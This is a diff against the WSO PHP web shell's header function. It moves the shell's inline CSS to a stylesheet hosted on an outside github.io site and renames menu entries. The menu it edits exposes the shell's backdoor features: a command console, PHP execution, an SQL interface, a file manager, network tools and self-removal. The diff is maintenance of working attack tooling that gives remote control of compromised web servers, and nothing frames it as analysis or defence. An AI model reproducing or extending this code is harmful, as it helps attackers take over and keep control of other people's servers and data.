@@ -131,40 +131,7 @@ function wsoHeader() {
 		$_POST['charset'] = $GLOBALS['default_charset'];
 	global $color;
 	 echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " - WSO " . VERSION ."</title> 
-<style> 
-    body {background-color:#060A10; color:#e1e1e1; margin:0; font:normal 75% Arial, Helvetica, sans-serif; } canvas{ display: block; vertical-align: bottom;} 
-    #particles-js{width: 100%; height: 100px; background-color: #060a10; background-image: url(''); background-repeat: no-repeat; background-size: cover; background-position: 50% 50%;} 
-    body,td,th    {font:10pt tahoma,arial,verdana,sans-serif,Lucida Sans;margin:0;vertical-align:top;} 
-    table.info    {color:#C3C3C3;} 
-    table#toolsTbl {background-color: #060A10;} 
-    span,h1,a    {color:#fff !important;} 
-    span        {font-weight:bolder;} 
-    h1            {border-left:5px solid #2E6E9C;padding:2px 5px;font:14pt Verdana;background-color:#10151c;margin:0px;} 
-    div.content    {padding:5px;margin-left:5px;background-color:#060a10;} 
-    a            {text-decoration:none;} 
-    a:hover        {text-decoration:underline;} 
-    .tooltip::after {background:#0663D5;color:#FFF;content: attr(data-tooltip);margin-top:-50px;display:block;padding:6px 10px;position:absolute;visibility:hidden;} 
-    .tooltip:hover::after {opacity:1;visibility:visible;} 
-    .ml1        {border:1px solid #202832;padding:5px;margin:0;overflow:auto;} 
-    .bigarea    {min-width:100%;max-width:100%;height:400px;} 
-    input, textarea, select    {margin:0;color:#fff;background-color:#202832;border:none;font:9pt Courier New;outline:none;} 
-    label:before {content:'';right:0; top:0;width:17px; height:17px;background:#202832;position:absolute;pointer-events:none;display:block;} 
-    form        {margin:0px;} 
-    #toolsTbl   {text-align:center;} 
-    #fak        {background:none;} 
-    #fak td     {padding:5px 0 0 0;} 
-    iframe      {border:1px solid #060a10;} 
-    .toolsInp   {width:300px} 
-    .main th    {text-align:left;background-color:#202832;} 
-    .main tr:hover{background-color:#2e6e9c;} 
-    .main td, th{vertical-align:middle;} 
-    input[type='submit']{background-color:#2E6E9C;} 
-    input[type='button']{background-color:#2E6E9C;} 
-    input[type='submit']:hover{background-color:#56AD15;} 
-    input[type='button']:hover{background-color:#56AD15;} 
-    .l1            {background-color:#202832;} 
-    pre            {font:9pt Courier New;} 
-</style> 
+<link rel='stylesheet' href='https://cumaiseng.github.io/assets/wso.css'/>
 <script>
     var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';
     var a_ = '" . htmlspecialchars(@$_POST['a']) ."'
@@ -261,10 +228,10 @@ function wsoHeader() {
 	foreach($charsets as $item)
 		$opt_charsets .= '<option value="'.$item.'" '.($_POST['charset']==$item?'selected':'').'>'.$item.'</option>';
 
-	$m = array('Sec. Info'=>'SecInfo','Filemanager'=>'FilesMan','Console'=>'Console','Sql Interface'=>'Sql','Php Exec'=>'Php','Stringtool'=>'StringTools','Network'=>'Network');
+	$m = array('Sec. Info'=>'SecInfo','Filemanager'=>'FilesMan','Console'=>'Console','Sql Interface'=>'Sql','Php Exec'=>'Php','String Tools'=>'StringTools','Network'=>'Network');
 	if(!empty($GLOBALS['auth_pass']))
 		$m['Logout'] = 'Logout';
-	$m['Self remove'] = 'SelfRemove';
+	$m['Self Remove'] = 'SelfRemove';
 	$menu = '';
 	foreach($m as $k => $v)
 		$menu .= '<th width="'.(int)(100/count($m)).'%">[ <a href="#" onclick="g(\''.$v.'\',null,\'\',\'\',\'\')">'.$k.'</a> ]</th>';
